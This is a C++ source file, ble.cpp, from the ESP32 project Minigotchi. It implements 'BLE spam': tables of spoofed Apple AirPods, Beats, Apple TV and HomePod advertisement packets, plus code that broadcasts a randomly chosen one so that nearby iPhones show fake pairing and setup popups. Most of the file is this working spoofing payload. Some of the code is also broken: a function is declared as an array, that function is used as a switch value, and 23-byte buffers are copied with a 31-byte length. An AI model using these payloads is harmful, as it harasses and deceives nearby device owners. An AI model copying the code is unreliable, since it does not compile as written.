/*
 * Minigotchi: An even smaller Pwnagotchi
 * Copyright (C) 2024 dj1ch
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

/**
 * ble.cpp: Handles BLE spam
 */

/**
 * Relies off of implementation from:
 * https://github.com/ECTO-1A/AppleJuice/blob/main/ESP32-Arduino/applejuice/applejuice.ino
 *
 * Additional Credit:
 *
 * ESP32 Arduino implementation of Apple Juice*
 * Author: Ronald Stoner
 * Github: https://github.com/ronaldstoner
 */

#include "ble.h"

BLEAdvertising *Ble::pAdvertising;

int Ble::random(int min, int max) {
  return min + (esp_random() % (max - min + 1));
}

// User selectable variables
/** Developer note:
 *
 * This will randomize the device type,
 * using this lambda function to return a random number
 * on startup.
 *
 * However, during runtime, you can call
 * Ble::deviceType() = Ble::random(1, 26);
 * and that is perfectly fine.
 *
 */
int Ble::deviceType[]() { // 1 for Airpods, 2 for Airpods Pro, 3 for Airpods
  // Max, 4 for...
  srand(esp_random());
  return Ble::random(1, 26);
}
int Ble::delaySeconds = 5; // delay in seconds
int Ble::advType = 2;
// 0 - ADV_TYPE_IND
// 1 - ADV_TYPE_DIRECT_IND_HIGH (directed advertisement with high duty cycle)
// 2 - ADV_TYPE_SCAN_IND
// 3 - ADV_NONCONN_IND
// 4 - ADV_TYPE_DIRECT_IND_LOW (directed advertisement with low duty cycle)

/**
 * Gets first instance of mood class
 */
Mood &Ble::mood = Mood::getInstance();

// Payload data
uint8_t dataAirpods[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02,
                           0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                           0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataAirpodsPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e,
                              0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                              0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataAirpodsMax[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a,
                              0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                              0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataAirpodsGen2[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f,
                               0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                               0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                               0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataAirpodsGen3[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13,
                               0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                               0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                               0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataAirpodsProGen2[31] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa,
    0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataPowerBeats[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03,
                              0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                              0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataPowerBeatsPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b,
                                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsSoloPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c,
                                0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                                0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsStudioBuds[31] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa,
    0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsFlex[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10,
                             0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                             0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                             0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsX[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05,
                          0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                          0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsSolo3[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06,
                              0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                              0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsStudio3[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09,
                                0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                                0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsStudioPro[31] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa,
    0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsFitPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12,
                               0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                               0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                               0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsStudioBudsPlus[31] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa,
    0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataAppleTVSetup[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00,
                                0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c,
                                0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataAppleTVPair[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00,
                               0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c,
                               0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataAppleTVNewUser[23] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
    0xc1, 0x20, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataAppleTVAppleIDSetup[23] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
    0xc1, 0x2b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataAppleTVWirelessAudioSync[23] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
    0xc1, 0xc0, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataAppleTVHomekitSetup[23] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
    0xc1, 0x0d, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataAppleTVKeyboard[23] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
    0xc1, 0x13, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataAppleTVConnectingToNetwork[23] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
    0xc1, 0x27, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataHomepodSetup[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00,
                                0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0b, 0x60, 0x4c,
                                0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataSetupNewPhone[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00,
                                 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c,
                                 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataTransferNumber[23] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
    0xc1, 0x02, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataTVColorBalance[23] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
    0xc1, 0x1e, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};

/**
 * Initializes bluetooth and sets up payload
 */
void Ble::init() {
  BLEDevice::init("");

  // Create the BLE Server
  BLEServer *pServer = BLEDevice::createServer();

  pAdvertising = pServer->getAdvertising();
  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  // Select the appropriate data based on the device type
  uint8_t *data;
  switch (deviceType) {
  case 1:
    data = dataAirpods;
    break;
  case 2:
    data = dataAirpodsPro;
    break;
  case 3:
    data = dataAirpodsMax;
    break;
  case 4:
    data = dataAirpodsGen2;
    break;
  case 5:
    data = dataAirpodsGen3;
    break;
  case 6:
    data = dataAirpodsProGen2;
    break;
  case 7:
    data = dataPowerBeats;
    break;
  case 8:
    data = dataPowerBeatsPro;
    break;
  case 9:
    data = dataBeatsSoloPro;
    break;
  case 10:
    data = dataBeatsStudioBuds;
    break;
  case 11:
    data = dataBeatsFlex;
    break;
  case 12:
    data = dataBeatsX;
    break;
  case 13:
    data = dataBeatsSolo3;
    break;
  case 14:
    data = dataBeatsStudio3;
    break;
  case 15:
    data = dataBeatsStudioPro;
    break;
  case 16:
    data = dataBeatsFitPro;
    break;
  case 17:
    data = dataBeatsStudioBudsPlus;
    break;
  case 18:
    data = dataAppleTVSetup;
    break;
  case 19:
    data = dataAppleTVPair;
    break;
  case 20:
    data = dataAppleTVNewUser;
    break;
  case 21:
    data = dataAppleTVAppleIDSetup;
    break;
  case 22:
    data = dataAppleTVWirelessAudioSync;
    break;
  case 23:
    data = dataAppleTVHomekitSetup;
    break;
  case 24:
    data = dataAppleTVKeyboard;
    break;
  case 25:
    data = dataAppleTVConnectingToNetwork;
    break;
  case 26:
    data = dataTVColorBalance;
    break;
  default:
    data = dataAirpods; // default to dataAirpods if no valid deviceType is
    // provided
    break;
  }
  // This flag does not seem to be needed for ESP32 BLE
  // oAdvertisementData.setFlags(0x03);

  // Set the advertisement data type
  switch (advType) {
  case 0:
    pAdvertising->setAdvertisementType(ADV_TYPE_IND);
    break;
  case 1:
    pAdvertising->setAdvertisementType(ADV_TYPE_DIRECT_IND_HIGH);
    break;
  case 2:
    pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
    break;
  case 3:
    pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
    break;
  case 4:
    pAdvertising->setAdvertisementType(ADV_TYPE_DIRECT_IND_LOW);
    break;
  }

  // Set up the advertisement data
  oAdvertisementData.addData(std::string((char *)data, sizeof(dataAirpods)));
  pAdvertising->setAdvertisementData(oAdvertisementData);
}

/**
 * Starts BLE
 */
void Ble::start() {
  Serial.println(mood.getIntense() + " Starting BLE Spam...");
  Display::updateDisplay(mood.getIntense(), "Starting BLE Spam...");
  pAdvertising->start();
  delay(delaySeconds * 1000);
  pAdvertising->stop();
  Display::updateDisplay(mood.getNeutral(), "BLE Spam Stopped");
  Serial.println(mood.getNeutral() + " BLE Spam Stopped");
}

/**
 * *Manually* stops BLE spam if it is already running
 */
void Ble::stop() { pAdvertising->stop(); }

/**
 * Self explanatory...
 */
void Ble::spam() {
  if (Config::spam) {
    Ble::init();
    Ble::start();
  } else {
    // do nothing
  }
}
